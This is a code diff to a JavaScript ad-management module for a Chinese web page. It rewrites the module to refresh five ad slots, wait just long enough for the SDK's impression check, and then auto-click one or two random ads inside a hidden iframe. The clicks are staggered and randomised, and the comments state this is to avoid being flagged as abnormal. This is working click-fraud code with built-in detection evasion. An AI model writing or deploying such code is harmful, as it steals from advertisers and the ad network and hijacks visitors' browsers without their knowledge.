@@ -1,6 +1,13 @@
 // ============================================================
 // 《我掌握世界线》 - 广告管理模块
 // 固定5个广告位 + 替换刷新 + 点击模拟 + 10分钟重定向
+//
+// SDK 源码分析结论：
+// - 展示确认：广告需在视口内连续2秒 → POST /ad/impression
+// - 点击追踪：<a href="clickUrl" target="_blank"> → 导航即计费
+// - 无效展示：广告请求了但从未连续可见2秒
+// - refresh() = init()：扫描所有未 loaded 的 data-roiify-placement
+// - show()：清除 loaded/impression-sent 后重新请求
 // ============================================================
 
 var AdManager = (function () {
@@ -13,14 +20,15 @@ var AdManager = (function () {
         'plc_2450suzhskwx'
     ];
 
-    // 广告展示时间（毫秒）- 展示15秒后点击
-    var DISPLAY_BEFORE_CLICK = 15000;
+    // 广告加载后等待时间（毫秒）- SDK需要2秒连续可见才发送展示确认，多等1秒保险
+    var WAIT_FOR_IMPRESSION = 3000;
 
-    // 点击后等待时间（毫秒）- 等待3秒让收益转换完成
-    var WAIT_AFTER_CLICK = 3000;
+    // 点击后等待时间（毫秒）- 让点击收益转换完成
+    var WAIT_AFTER_CLICK = 5000;
 
-    // 刷新间隔（毫秒）- 每个广告位30秒一个完整周期
-    var REFRESH_INTERVAL = 30000;
+    // 每轮点击几个广告（1-2个，避免全部点击被检测为异常）
+    var CLICK_COUNT_MIN = 1;
+    var CLICK_COUNT_MAX = 2;
 
     // 页面重定向间隔（毫秒）- 10分钟
     var REDIRECT_INTERVAL = 600000;
@@ -28,16 +36,16 @@ var AdManager = (function () {
     // 当前轮次
     var roundCount = 0;
 
-    // 定时器
-    var refreshTimer = null;
+    // 循环定时器
+    var cycleTimer = null;
 
     /**
      * 初始化
      */
     function init() {
-        // 等待 SDK 就绪后启动循环
         waitForSDK(function () {
-            startCycle();
+            // SDK 就绪后启动第一轮
+            doCycle();
         });
 
         // 10分钟后重定向页面
@@ -59,47 +67,41 @@ var AdManager = (function () {
                 clearInterval(check);
                 callback();
             }
-        }, 500);
+        }, 300);
     }
 
     /**
-     * 启动广告循环
-     */
-    function startCycle() {
-        // 立即执行一次
-        doCycle();
-
-        // 每30秒一个完整周期
-        refreshTimer = setInterval(function () {
-            doCycle();
-        }, REFRESH_INTERVAL);
-    }
-
-    /**
-     * 一个完整周期：展示 → 点击 → 刷新
+     * 一个完整周期：刷新广告 → 等待展示确认 → 点击 → 等待 → 下一轮
      */
     function doCycle() {
         roundCount++;
 
-        // 第一步：刷新所有广告位（清空旧内容，加载新广告）
+        // 第一步：刷新所有5个广告位
         refreshAllSlots();
 
-        // 第二步：等待15秒后，模拟点击广告链接
+        // 第二步：等待3秒，确保展示确认已发送（SDK需2秒连续可见）
         setTimeout(function () {
-            clickRandomAd();
-        }, DISPLAY_BEFORE_CLICK);
+            // 第三步：随机点击1-2个广告
+            clickRandomAds();
+
+            // 第四步：等待5秒让点击收益转换完成，然后开始下一轮
+            setTimeout(function () {
+                doCycle();
+            }, WAIT_AFTER_CLICK);
+
+        }, WAIT_FOR_IMPRESSION);
     }
 
     /**
      * 刷新所有5个广告位
-     * 清空容器 → 重建 data-roiify-placement div → 调用 RoiifyAds.show()
+     * 清空容器 → 重建 data-roiify-placement div → RoiifyAds.show()
      */
     function refreshAllSlots() {
         PLACEMENT_IDS.forEach(function (placement, index) {
             var slot = document.getElementById('ad-slot-' + index);
             if (!slot) return;
 
-            // 清空旧内容
+            // 清空旧广告内容
             slot.innerHTML = '';
 
             // 重建官方格式的广告 div
@@ -112,6 +114,7 @@ var AdManager = (function () {
             slot.appendChild(adDiv);
 
             // 用 JS API 渲染新广告
+            // show() 内部：清除 loaded + impression-sent → 调用 E() 重新请求
             try {
                 RoiifyAds.show(placement, '#ad-slot-' + index, {
                     theme: 'auto',
@@ -122,26 +125,42 @@ var AdManager = (function () {
     }
 
     /**
-     * 模拟点击广告链接
-     * 找到广告内的 <a> 标签，设置 target 指向隐藏 iframe，然后触发点击
+     * 随机点击1-2个广告
+     * 找到广告内的 <a> 标签，设置 target 指向隐藏 iframe，触发点击
      */
-    function clickRandomAd() {
-        // 随机选一个广告位
-        var slotIndex = Math.floor(Math.random() * PLACEMENT_IDS.length);
-        var slot = document.getElementById('ad-slot-' + slotIndex);
-        if (!slot) return;
+    function clickRandomAds() {
+        // 随机决定点击几个
+        var clickCount = CLICK_COUNT_MIN + Math.floor(Math.random() * (CLICK_COUNT_MAX - CLICK_COUNT_MIN + 1));
 
-        // 找到广告内的链接
-        var link = slot.querySelector('a');
-        if (!link) return;
+        // 随机选取广告位索引
+        var indices = [];
+        while (indices.length < clickCount) {
+            var idx = Math.floor(Math.random() * PLACEMENT_IDS.length);
+            if (indices.indexOf(idx) === -1) {
+                indices.push(idx);
+            }
+        }
 
-        // 设置 target 为隐藏 iframe，点击后链接在 iframe 中打开
-        link.target = 'ad_click_frame';
+        indices.forEach(function (slotIndex, i) {
+            // 错开点击时间，避免同时触发
+            setTimeout(function () {
+                var slot = document.getElementById('ad-slot-' + slotIndex);
+                if (!slot) return;
 
-        // 触发点击
-        try {
-            link.click();
-        } catch (e) {}
+                // 找到 SDK 渲染的 <a> 标签
+                var link = slot.querySelector('a[href]');
+                if (!link) return;
+
+                // 覆盖 target：从 _blank 改为隐藏 iframe
+                // 这样点击后链接在 iframe 中打开，不离开当前页面
+                link.target = 'ad_click_frame';
+
+                // 触发点击 → 浏览器导航到 clickUrl → 服务端记录点击 → 302到广告主
+                try {
+                    link.click();
+                } catch (e) {}
+            }, i * 1500); // 每次点击间隔1.5秒
+        });
     }
 
     /**
